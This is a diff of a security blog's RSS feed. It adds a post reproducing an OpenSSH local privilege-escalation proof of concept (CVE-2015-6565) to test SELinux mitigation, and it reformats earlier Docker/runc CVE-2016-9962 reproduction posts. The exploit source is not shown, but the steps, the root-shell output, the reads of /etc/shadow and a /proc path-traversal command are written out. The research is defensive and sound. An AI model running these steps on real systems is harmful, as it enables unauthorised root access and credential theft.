@@ -7,8 +7,250 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-JP</language>
     <copyright>SOSS SIG all rights reserved. 2016</copyright>
-    <lastBuildDate>Mon, 23 Jan 2017 13:07:34 +0900</lastBuildDate>
+    <lastBuildDate>Thu, 02 Feb 2017 09:46:27 +0900</lastBuildDate>
     <atom:link href="https://jsoss-sig.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>OpenSSH vulnerability (CVE-2015-6565) PoC with SELinux</title>
+      <link>https://jsoss-sig.github.io/post/omok-selinux-openssh-20170201/</link>
+      <pubDate>Thu, 02 Feb 2017 09:46:27 +0900</pubDate>
+      
+      <guid>https://jsoss-sig.github.io/post/omok-selinux-openssh-20170201/</guid>
+      <description>
+
+&lt;p&gt;We found there was information about PoC to get local priveledge with
+CVE-2015-6565(vulnerability for OpenSSH), then we want to make sure can we
+protect it by using SELinux or not.&lt;/p&gt;
+
+&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
+
+&lt;h4 id=&#34;http-www-openwall-com-lists-oss-security-2017-01-26-2&#34;&gt;&lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/01/26/2&#34;&gt;http://www.openwall.com/lists/oss-security/2017/01/26/2&lt;/a&gt;&lt;/h4&gt;
+
+&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;
+
+&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used Fedora22-VMWare Guest
+because this vulnerability is for OpenSSH 6.8-6.9. Also I assigned only 1 CPU
+to that guest.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Install Fedora22 with OpenSSH-enabled / enabled gcc and those dev tool. Because this is for PoC I didn&amp;rsquo;t update Fedora22(everything package versions are same as DVD).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The openssh version is 6.8p1-5 ;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    [root@localhost ~]# rpm -qa|grep -i openssh
+    openssh-6.8p1-5.fc22.x86_64
+    openssh-server-6.8p1-5.fc22.x86_64
+    openssh-clients-6.8p1-5.fc22.x86_64
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Put PoC code which you can see on &lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/01/26/2&#34;&gt;the referenced page.&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Compile that code on PoC Fedora22;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost ~]$  gcc not_an_sshnuke.c -o not_an_sshnuke
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc&#34;&gt;PoC&lt;/h2&gt;
+
+&lt;p&gt;Now it&amp;rsquo;s ready for PoC.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Run the code with normal user account;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run the code with normal user account;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
+[*] Waiting for slave device /dev/pts/3
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Open 2 terminals and ssh to the PoC machine in each terminal with normal user account;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
+jsossug@172.16.148.139&#39;s password: 
+Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
+[jsossug@localhost ~]$ 
+
+
+[jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
+jsossug@172.16.148.139&#39;s password: 
+Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
+[jsossug@localhost ~]$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Open another terminal and ssh to the PoC machine with &lt;strong&gt;root&lt;/strong&gt; account. If ;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@extest ~]$ ssh -l root 172.16.148.139
+root@172.16.148.139&#39;s password: 
+Last login: Sun Jan 29 14:06:37 2017 from 172.16.148.1
+[root@localhost ~]# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;On the first terminal, you can see following results;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
+[*] Waiting for slave device /dev/pts/3
+[+] Got PTY slave /dev/pts/3
+[+] Making PTY slave the controlling terminal
+[+] SUID shell at /tmp/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Just want to make sure /tmp/sh attribute;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@localhost ~]# ls -lZ /tmp/sh
+-rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:31 /tmp/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Then run /tmp/sh on first terminal with following option;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Now we got &amp;ldquo;euid=0&amp;rdquo;;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sh-4.3# id
+uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.3# cat /etc/shadow
+bin:*:16489:0:99999:7:::
+daemon:*:16489:0:99999:7:::
+adm:*:16489:0:99999:7:::
+lp:*:16489:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;SELinux is &amp;ldquo;Enabled&amp;rdquo;;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;sh-4.3# getenforce
+Enforcing
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc-with-updated-selinux&#34;&gt;PoC with &amp;ldquo;updated SELinux&amp;rdquo;&lt;/h2&gt;
+
+&lt;p&gt;So, we found normal(non-upgraded) SELinux Policy on Fedora22 can&amp;rsquo;t protect
+tihs vulnerability.&lt;/p&gt;
+
+&lt;p&gt;Then now we wonder how about &amp;ldquo;updated SELinux Policy&amp;rdquo;.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Update SELinux Policy;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@localhost ~]# dnf -y update selinux-policy-targeted
+Fedora 22 - x86_64 - Updates                    2.2 MB/s |  23 MB     00:10    
+Last metadata expiration check performed 0:00:13 ago on Wed Feb  1 04:46:43 2017.
+Dependencies resolved.
+================================================================================
+ Package                    Arch      Version                  Repository  Size
+================================================================================
+Upgrading:
+ selinux-policy             noarch    3.13.1-128.28.fc22       updates    428 k
+ selinux-policy-targeted    noarch    3.13.1-128.28.fc22       updates    4.1 M
+
+Transaction Summary
+================================================================================
+Upgrade  2 Packages
+
+Total download size: 4.5 M
+Downloading Packages:
+  (1/2): selinux-policy-3.13.1-128.28.fc22.noarch 1.6 MB/s | 428 kB     00:00    
+  (2/2): selinux-policy-targeted-3.13.1-128.28.fc 998 kB/s | 4.1 MB     00:04    
+--------------------------------------------------------------------------------
+Total                                           825 kB/s | 4.5 MB     00:05     
+Running transaction check
+Transaction check succeeded.
+Running transaction test
+Transaction test succeeded.
+Running transaction
+  Upgrading   : selinux-policy-3.13.1-128.28.fc22.noarch                    1/4 
+  Upgrading   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           2/4 
+  Cleanup     : selinux-policy-targeted-3.13.1-122.fc22.noarch              3/4 
+  Cleanup     : selinux-policy-3.13.1-122.fc22.noarch                       4/4 
+  Verifying   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           1/4 
+  Verifying   : selinux-policy-3.13.1-128.28.fc22.noarch                    2/4 
+  Verifying   : selinux-policy-3.13.1-122.fc22.noarch                       3/4 
+  Verifying   : selinux-policy-targeted-3.13.1-122.fc22.noarch              4/4 
+
+Upgraded:
+  selinux-policy.noarch 3.13.1-128.28.fc22                                      
+  selinux-policy-targeted.noarch 3.13.1-128.28.fc22                             
+
+Complete!
+[root@localhost ~]# getenforce
+Enforcing
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;We continue to that PoC with updated SELinux Policy again;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
+[*] Waiting for slave device /dev/pts/3
+[+] Got PTY slave /dev/pts/3
+[+] Making PTY slave the controlling terminal
+[+] SUID shell at /tmp/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Just want to make sure /tmp/sh attribute;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[root@localhost ~]# ls -lZ /tmp/sh
+-rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:47 /tmp/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run /tmp/sh with updated SELinux Policy;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
+sh-4.3# id
+uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.3# cat /etc/shadow
+bin:*:16489:0:99999:7:::
+daemon:*:16489:0:99999:7:::
+adm:*:16489:0:99999:7:::
+lp:*:16489:0:99999:7:::
+sh-4.3# exit
+exit
+[jsossug@localhost src]$ getenforce
+Enforcing
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Just we want to make sure SELinux Policy is updated;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ rpm -qa|grep -i selinux-policy
+selinux-policy-3.13.1-128.28.fc22.noarch
+selinux-policy-targeted-3.13.1-128.28.fc22.noarch
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;It seems that even if we update SELinux Policy, we can&amp;rsquo;t mitigate this
+vulnerability(CVE-2015-6565).&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Now we could see that CVE-2015-6565 PoC is successfull even if SELinux is
+enforcing. The main reason is because that vulnerability is using TIOCSTI +
+ioctl.&lt;/p&gt;
+
+&lt;p&gt;This seems to be close to &lt;a href=&#34;https://www.spinics.net/lists/selinux/msg20112.html&#34;&gt;CVE-2016-7545(can escape SELinux sandboxing). In
+that vulnerability, we could fix it by updating
+policycoreutils.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Probably we can modify SELinux policy and could be mitigate this
+vulnerability. We will continue to check it.&lt;/p&gt;
+
+&lt;p&gt;Also we couldn&amp;rsquo;t reproduce it on Fedora25+openssh6.8p1.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Docker vulnerability (CVE-2016-9962) PoC with SELinux (Again)</title>
@@ -21,13 +263,13 @@
 &lt;p&gt;This blog is for following up to reproduce CVE-2016-9962(vulnerability for
 Docker) and how can we mitigate it by using SELinux.&lt;/p&gt;
 
+&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;
+
 &lt;hr /&gt;
 
 &lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
 
-&lt;h4 id=&#34;docker-vulnerability-cve-2016-9962-poc-with&#34;&gt;[Docker vulnerability (CVE-2016-9962) PoC with&lt;/h4&gt;
-
-&lt;p&gt;SELinux](&lt;a href=&#34;https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/&#34;&gt;https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/&lt;/a&gt;)&lt;/p&gt;
+&lt;h4 id=&#34;docker-vulnerability-cve-2016-9962-poc-with-selinux-https-jsoss-sig-github-io-post-omok-selinux-docker-20170118&#34;&gt;&lt;a href=&#34;https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/&#34;&gt;Docker vulnerability (CVE-2016-9962) PoC with SELinux&lt;/a&gt;&lt;/h4&gt;
 
 &lt;h4 id=&#34;https-bugzilla-redhat-com-show-bug-cgi-id-1409531&#34;&gt;&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&lt;/a&gt;&lt;/h4&gt;
 
@@ -70,8 +312,7 @@ container_runtime_exec_t file(/usr/bin/runc), such as;&lt;/p&gt;
 
 
 
-./container.cil:(typetransition initrc_domain container_runtime_exec_t process c
-ontainer_runtime_t)
+./container.cil:(typetransition initrc_domain container_runtime_exec_t process container_runtime_t)
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Then, for doing PoC more close to existance situation, we need to run &amp;ldquo;runc&amp;rdquo;
@@ -202,16 +443,14 @@ unconfined_u:system_r:container_t:s0-s0:c0.c1023 6799 pts/1 Sl+   0:00 runc run 
 &lt;li&gt;&lt;p&gt;Check SELinux is enabled;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# getenforce
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Enforcing&lt;/p&gt;&lt;/li&gt;
+Enforcing
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;run container(sh) in shell1;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/ #&lt;/p&gt;&lt;/li&gt;
+/ # 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;run new container in shell2 with &amp;ldquo;runc exec&amp;rdquo; command. It is pausing 500sec;&lt;/p&gt;
 
@@ -221,39 +460,36 @@ unconfined_u:system_r:container_t:s0-s0:c0.c1023 6799 pts/1 Sl+   0:00 runc run 
 &lt;li&gt;&lt;p&gt;run &amp;ldquo;ps ax&amp;rdquo; in shell1. You can see shell2 process;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/ # ps ax
+/ # ps ax
 PID   USER     TIME   COMMAND
     1 root       0:00 sh
     6 root       0:00 /proc/self/exe init
    11 root       0:00 ps ax
-/ #&lt;/p&gt;&lt;/li&gt;
+/ # 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;In above case, check /proc/6/fd by ls command. You see path as fd/4;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;/ # ls -la /proc/6/fd/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;total 0
-dr-x&amp;mdash;&amp;mdash;    2 root     root             0 Jan 16 06:43 .
+total 0
+dr-x------    2 root     root             0 Jan 16 06:43 .
 dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
-lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
-lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
-lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
-l-wx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
-/ #&lt;/p&gt;&lt;/li&gt;
+lrwx------    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
+lrwx------    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
+lr-x------    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
+lrwx------    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
+lr-x------    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
+l-wx------    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
+/ # 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;Do ls /etc/shadow file by using &amp;ldquo;/proc/6/fd/4/../../../etc/shadow&amp;rdquo; path;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;/ # ls -l /proc/6/fd/4/../../../etc/shadow
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;ls: /proc/6/fd/4/../../../etc/shadow: Permission denied&lt;/p&gt;&lt;/li&gt;
+ls: /proc/6/fd/4/../../../etc/shadow: Permission denied
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Check /var/log/audit/audit.log;&lt;/p&gt;
@@ -267,23 +503,22 @@ l-wx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 7 -&amp
 &lt;li&gt;&lt;p&gt;Also you can&amp;rsquo;t read /etc/shadow file because the file permission is &amp;ldquo;000&amp;rdquo;.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;/ # cat /proc/6/fd/4/../../../etc/shadow
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;cat: can&amp;rsquo;t open &amp;lsquo;/proc/6/fd/4/../../../etc/shadow&amp;rsquo;: Permission denied&lt;/p&gt;&lt;/li&gt;
+cat: can&#39;t open &#39;/proc/6/fd/4/../../../etc/shadow&#39;: Permission denied
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;If I change /etc/shadow file as &amp;ldquo;755&amp;rdquo; permission, the DAC control will permit
 to read the file.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;    [root@fedora25 ~]# chmod 755 /etc/shadow
-[root@fedora25 ~]# ls -lh /etc/shadow
--rwxr-xr-x. 1 root root 1.3K Jan 20 08:30 /etc/shadow
+    [root@fedora25 ~]# ls -lh /etc/shadow
+    -rwxr-xr-x. 1 root root 1.3K Jan 20 08:30 /etc/shadow
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;But still I can&amp;rsquo;t read /etc/shadow file ;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;    / # cat /proc/6/fd/4/../../../etc/shadow
-cat: can&#39;t open &#39;/proc/6/fd/4/../../../etc/shadow&#39;: Permission denied
+    cat: can&#39;t open &#39;/proc/6/fd/4/../../../etc/shadow&#39;: Permission denied
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;I could see in the /var/log/audit/audit.log file that the&amp;rdquo;read&amp;rdquo; action is
@@ -315,6 +550,8 @@ environment.&lt;/p&gt;
 &lt;p&gt;Here we described how to reproduce CVE-2016-9962(vulnerability for Docker) and
 how can we protect it by using SELinux.&lt;/p&gt;
 
+&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;
+
 &lt;hr /&gt;
 
 &lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
@@ -335,9 +572,7 @@ checking other container&amp;rsquo;s status.&lt;/p&gt;
 &lt;li&gt;&lt;p&gt;Install docker, runc on your PC.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -qa|grep -i docker
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;golang-github-fsouza-go-dockerclient-devel-0.2.1-17.git2350d7b.fc25.noarch
+golang-github-fsouza-go-dockerclient-devel-0.2.1-17.git2350d7b.fc25.noarch
 golang-github-docker-go-unit-test-devel-1.5.1-0.3.gitd30aec9.fc25.x86_64
 golang-github-docker-go-devel-1.5.1-0.3.gitd30aec9.fc25.noarch
 docker-devel-1.12.6-3.git51ef5a8.fc25.noarch
@@ -346,12 +581,12 @@ docker-1.12.6-4.gitf499e8b.fc25.x86_64
 golang-github-docker-libcontainer-2.1.1-0.8.gitc964368.fc25.x86_64
 golang-github-docker-go-connections-devel-0.1.2-0.2.git6e4c13d.fc25.noarch
 docker-common-1.12.6-4.gitf499e8b.fc25.x86_64
-golang-github-docker-go-connections-unit-test-devel-0.1.2-0.2.git6e4c13d.fc2
-5.x86_64
+golang-github-docker-go-connections-unit-test-devel-0.1.2-0.2.git6e4c13d.fc25.x86_64
 golang-github-docker-go-units-devel-0.2.0-3.fc25.noarch
 [root@localhost ~]# rpm -qa|grep -i runc
 runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64
-runc-devel-0.1.1-4.git57b9972.fc25.noarch&lt;/p&gt;&lt;/li&gt;
+runc-devel-0.1.1-4.git57b9972.fc25.noarch
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;Start docker.&lt;/p&gt;
 
@@ -372,20 +607,18 @@ runc-devel-0.1.1-4.git57b9972.fc25.noarch&lt;/p&gt;&lt;/li&gt;
 , &amp;ldquo;small_lumiere&amp;rdquo; is the name.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# docker ps -a
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;[root@localhost ~]# docker ps -a
-CONTAINER ID        IMAGE               COMMAND             CREATED&lt;br /&gt;
+[root@localhost ~]# docker ps -a
+CONTAINER ID        IMAGE               COMMAND             CREATED         
 STATUS              PORTS               NAMES
-965456106c88        alpine              &amp;ldquo;&amp;ndash;name alpine&amp;rdquo;     6 hours ago&lt;br /&gt;
-Created                                 small_lumiere&lt;/p&gt;&lt;/li&gt;
+965456106c88        alpine              &amp;quot;--name alpine&amp;quot;     6 hours ago     
+Created                                 small_lumiere
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;create &amp;ldquo;rootfs&amp;rdquo; directory and copy all of alpine file under rootfs/&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# mkdir rootfs
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;[root@localhost ~]# docker export small_lumiere |tar xvfC - rootfs&lt;/p&gt;&lt;/li&gt;
+[root@localhost ~]# docker export small_lumiere |tar xvfC - rootfs
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;create config.json&lt;/p&gt;
 
@@ -402,13 +635,9 @@ Created                                 small_lumiere&lt;/p&gt;&lt;/li&gt;
             ],
 &lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
-&lt;li&gt;&lt;p&gt;For PoC, we will modify runc source. Get/install runc SRPM and modify sourc
-e code.&lt;/p&gt;
+&lt;li&gt;&lt;p&gt;For PoC, we will modify runc source. Get/install runc SRPM and modify source code.&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -ivh /tmp/runc-1.0.0-3.rc2.gitc91b5be.fc25.src.r
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;pm
+&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -ivh /tmp/runc-1.0.0-3.rc2.gitc91b5be.fc25.src.rpm
 [root@localhost ~]# cd SOURCES/
 [root@localhost ~]# ls
 runc-c91b5be.tar.gz
@@ -428,56 +657,46 @@ Makefile              exec.go        ps.go                tty.go
 NOTICE                kill.go        restore.go           update.go
 PRINCIPLES.md         libcontainer   rlimit_linux.go      utils.go
 README.md             list.go        run.go               utils_linux.go
-[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# vi libcontai
-ner/setns_init_linux.go&lt;/p&gt;&lt;/li&gt;
+[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# vi libcontainer/setns_init_linux.go 
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;We add 2 lines ;&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;[root@localhost libcontainer]# diff -Nru setns_init_linux.go setns_init_
-&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;[root@localhost libcontainer]# diff -Nru setns_init_linux.go setns_init_linux.go.org 
+    --- setns_init_linux.go     2017-01-16 15:26:01.067477093 +0900
+    +++ setns_init_linux.go.org 2017-01-16 15:25:22.921553094 +0900
+    @@ -5,6 +5,7 @@
+import (
+    &amp;quot;fmt&amp;quot;
+    &amp;quot;os&amp;quot;
++   &amp;quot;time&amp;quot;
 
-&lt;p&gt;linux.go.org
-&amp;mdash; setns_init_linux.go 2017-01-16 15:26:01.067477093 +0900
-+++ setns_init_linux.go.org 2017-01-16 15:25:22.921553094 +0900
-@@ -5,6 +5,7 @@
- import (
-    &amp;ldquo;fmt&amp;rdquo;
-    &amp;ldquo;os&amp;rdquo;&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&amp;ldquo;time&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;&amp;ldquo;github.com/opencontainers/runc/libcontainer/apparmor&amp;rdquo;
-&amp;ldquo;github.com/opencontainers/runc/libcontainer/keys&amp;rdquo;
-@@ -49,5 +50,6 @@
-if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {
-    return err
-}&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;time.Sleep(500 * time.Second)
-return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())
-}&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
+    &amp;quot;github.com/opencontainers/runc/libcontainer/apparmor&amp;quot;
+    &amp;quot;github.com/opencontainers/runc/libcontainer/keys&amp;quot;
+    @@ -49,5 +50,6 @@
+    if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {
+        return err
+    }
++   time.Sleep(500 * time.Second)
+    return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())
+ }
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;make tar.gz and re-create runc package by using rpmbuild.&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;[root@localhost work]# tar -cvfrunc-c91b5be.tar runc-c91b5bea4830a57eac7
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;882d7455d59518cdf70ec
+&lt;pre&gt;&lt;code&gt;[root@localhost work]# tar -cvfrunc-c91b5be.tar runc-c91b5bea4830a57eac7882d7455d59518cdf70ec
 [root@localhost work]# gzip runc-c91b5be.tar
 [root@localhost work]# cp runc-c91b5be.tar.gz ../SOURCES
 [root@localhost work]# cd ../SPECS/
 [root@localhost SPECS]# rpmbuild -ba runc.spec
-[root@localhost SPECS]# cd ~&lt;/p&gt;&lt;/li&gt;
+[root@localhost SPECS]# cd ~
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;uninstall and re-install modified runc package;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -e runc
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;[root@localhost ~]# rpm -ivh rpmbuild/RPMS/x86_64/runc-1.0.0-3.rc2.gitc91b5b
-e.fc25.x86_64.rpm&lt;/p&gt;&lt;/li&gt;
+[root@localhost ~]# rpm -ivh rpmbuild/RPMS/x86_64/runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64.rpm
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;hr /&gt;
@@ -490,16 +709,14 @@ e.fc25.x86_64.rpm&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;Check SELinux is enabled;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;[root@localhost ~]# getenforce
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Enforcing&lt;/p&gt;&lt;/li&gt;
+Enforcing
